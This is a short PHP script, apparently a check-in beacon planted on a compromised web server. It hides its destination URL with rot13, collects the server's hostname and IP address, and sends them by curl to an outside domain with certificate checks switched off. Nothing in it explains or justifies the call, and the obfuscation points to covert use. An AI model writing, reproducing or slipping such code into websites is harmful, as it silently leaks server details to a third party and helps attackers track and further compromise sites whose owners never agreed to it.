<?php
$d = $_SERVER['HTTP_HOST'];
$i = $_SERVER['SERVER_ADDR'];
$u = 'uggcf://ynatynavk.pbz/cbfg.cuc';
$u = str_rot13($u);
$u = $u.'?1=' . urlencode($d) . '&2=' . urlencode($i);
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $u);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
$r = curl_exec($ch);
curl_close($ch);
?>